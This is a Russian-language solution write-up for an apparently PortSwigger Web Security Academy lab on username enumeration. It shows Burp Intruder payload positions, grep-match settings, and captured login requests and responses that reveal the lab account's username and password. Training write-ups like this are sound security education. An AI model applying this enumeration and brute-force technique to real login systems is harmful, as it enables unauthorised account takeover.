# Username enumeration via different responses
APPRENTICE

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

Candidate usernames
Candidate passwords
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Решение
Перебираю с помощью Inturder пользователей по [словарю](../wordlists/users.txt), указав фиксированный пароль "123". В Settings -> Grep - Match добавлю строку "Invalid username":

`username=§admin§&password=123`

У всех пользователей флаг "Invalid username" будет отмечен как 1, а у пользователя `aix` этого флага не будет.

```
POST /login HTTP/2
Host: 0aa600a10383338d83fd5f6000bb004b.web-security-academy.net
Cookie: session=IDG9Frw9586TYX06Q5XyCxPP7ZLf1E7F
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: https://0aa600a10383338d83fd5f6000bb004b.web-security-academy.net
Referer: https://0aa600a10383338d83fd5f6000bb004b.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

username=aix&password=123
```
Ответ:
```
<p class=is-warning>Incorrect password</p>
```
Теперь буду перебирать пароли пользователя `aix`. В Settings -> Grep - Match добавлю строку "Incorrect password":

`username=aix&password=§123§`

Найден пароль "123321":
```
POST /login HTTP/2
Host: 0aa600a10383338d83fd5f6000bb004b.web-security-academy.net
Cookie: session=IDG9Frw9586TYX06Q5XyCxPP7ZLf1E7F
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0aa600a10383338d83fd5f6000bb004b.web-security-academy.net
Referer: https://0aa600a10383338d83fd5f6000bb004b.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

username=aix&password=123321
```
```
HTTP/2 302 Found
Location: /my-account?id=aix
Set-Cookie: session=wM2v9C6MHSIFTKhcmkGWUWfq0ra7He78; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
Задание выполнено.